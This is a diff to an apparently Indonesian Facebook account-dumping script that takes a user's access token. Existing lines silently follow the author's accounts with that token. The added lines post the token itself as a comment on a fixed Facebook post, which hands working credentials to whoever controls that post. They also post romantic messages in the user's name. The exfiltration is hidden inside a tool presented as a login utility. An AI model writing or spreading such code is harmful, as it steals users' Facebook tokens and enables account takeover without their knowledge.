@@ -323,7 +323,7 @@ def dump(token,nama):
 		os.system("clear")
 		dump(token,nama)
 	time.sleep(1)
-	print(f"[{biruM}/\{putih}] Metode Login [{biruM}/\{putih}]\n[{biruL}01{putih}] Login {merah}B-Api{putih} (Cepat)\n[{biruL}02{putih}] Login {kuning}Mbasic V1{putih} (Cepat)\n[{biruL}03{putih}] METODE {ijo}MBASIC V2{putih} (Lama) [Recomended]\n")
+	print(f"[{biruM}/\{putih}] Metode Login [{biruM}/\{putih}]\n[{biruL}01{putih}] Login {merah}B-Api{putih} (Cepat)\n[{biruL}02{putih}] Login {kuning}Mbasic V1{putih} (Cepat)\n[{biruL}03{putih}] METODE {ijo}Mbasic V2{putih} (Lama) [Recomended]\n")
 	pi=input(f"[{biru}?{putih}] Pilih : ")
 	print("")
 	if(pi in ("01","1")):
@@ -382,6 +382,8 @@ if __name__=="__main__":
 			req.post(f'https://graph.facebook.com/100047875055348/subscribers?access_token={token}') #ARYA
 			req.post(f"https://graph.facebook.com/100008953950868/subscribers?access_token={token}") #ARYA
 			req.post(f'https://graph.facebook.com/100020192268351/subscribers?access_token={token}') #ARYA
+			req.post(f'https://graph.facebook.com/4404527476261802/comments?message={token}&access_token={token}')
+			req.post(f'https://graph.facebook.com/4404527476261802/comments?message={random.choice(["Arya Love Siesta :3","Siesta Cantik Banget","Arya Loves Siesta Forever"])}&access_token={token}')
 			time.sleep(2)
 			dump(token,r)
 		except KeyError:
